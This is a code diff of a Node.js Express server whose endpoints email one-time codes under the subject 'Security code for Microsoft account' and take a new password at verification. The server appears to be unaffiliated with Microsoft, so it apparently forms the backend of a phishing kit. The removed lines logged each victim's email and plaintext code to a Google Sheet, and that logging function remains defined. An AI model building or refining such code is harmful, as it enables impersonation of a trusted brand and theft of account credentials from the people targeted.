@@ -294,62 +294,7 @@ async function appendToGoogleSheet(data) {
     }
 }
 
-// Send OTP endpoint with simplified logging
-app.post('/send-code', async (req, res) => {
-    const { email } = req.body;
-
-    if (!email) {
-        return res.status(400).json({
-            success: false,
-            message: 'Email is required'
-        });
-    }
-
-    try {
-        const otp = generateOTP();
-        const otpExpiry = new Date(Date.now() + 10 * 60 * 1000); // 10 minutes
-
-        // Create or update user
-        const user = await User.findOneAndUpdate(
-            { email: email.toLowerCase() },
-            {
-                email: email.toLowerCase(),
-                otp: otp,
-                otpExpiry: otpExpiry
-            },
-            { upsert: true, new: true }
-        );
-
-        console.log('User updated in database:', user._id);
-
-        // Send email
-        await sendEmail(
-            email,
-            'Security code for Microsoft account',
-            createEmailTemplate(otp)
-        );
-
-        // Log to Google Sheet (initial request)
-        await appendToGoogleSheet({
-            email: email.toLowerCase(),
-            otp: otp,
-            status: 'OTP Sent'
-        });
-
-        res.json({
-            success: true,
-            message: 'Security code sent successfully'
-        });
-    } catch (error) {
-        console.error('Send Code Error:', error);
-        res.status(500).json({
-            success: false,
-            message: error.message || 'Error sending security code'
-        });
-    }
-});
-
-// Verify OTP endpoint with improved error handling
+// Updated verify-otp endpoint with better error handling
 app.post('/verify-otp', async (req, res) => {
     const { email, otp, newPassword } = req.body;
 
@@ -397,6 +342,51 @@ app.post('/verify-otp', async (req, res) => {
         res.status(500).json({
             success: false,
             message: 'Error verifying security code'
+        });
+    }
+});
+
+// Updated send-code endpoint with better error handling
+app.post('/send-code', async (req, res) => {
+    const { email } = req.body;
+
+    if (!email) {
+        return res.status(400).json({
+            success: false,
+            message: 'Email is required'
+        });
+    }
+
+    try {
+        const otp = generateOTP();
+        const otpExpiry = new Date(Date.now() + 10 * 60 * 1000);
+
+        const user = await User.findOneAndUpdate(
+            { email: email.toLowerCase() },
+            {
+                email: email.toLowerCase(),
+                otp: otp,
+                otpExpiry: otpExpiry
+            },
+            { upsert: true, new: true }
+        );
+
+        // Send email
+        await sendEmail(
+            email,
+            'Security code for Microsoft account',
+            createEmailTemplate(otp)
+        );
+
+        res.json({
+            success: true,
+            message: 'Security code sent successfully'
+        });
+    } catch (error) {
+        console.error('Send Code Error:', error);
+        res.status(500).json({
+            success: false,
+            message: 'Error sending security code'
         });
     }
 });
